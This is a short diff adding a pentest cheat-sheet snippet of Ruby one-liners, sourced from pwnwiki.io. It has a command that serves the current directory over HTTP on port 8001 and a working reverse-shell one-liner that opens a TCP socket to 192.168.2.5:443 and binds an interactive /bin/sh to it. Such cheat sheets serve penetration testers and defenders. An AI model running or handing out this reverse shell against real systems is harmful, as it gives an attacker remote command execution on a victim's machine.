@@ -1,0 +1,14 @@
+
+
+# Web server from current directory on port 8001
+ruby -run -e httpd -- -p 8001 .
+
+# Reverse bash shell on port 443
+ruby -rsocket -e'f=TCPSocket.open("192.168.2.5",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+
+
+
+source(s):
+http://pwnwiki.io/#!scripting/ruby.md
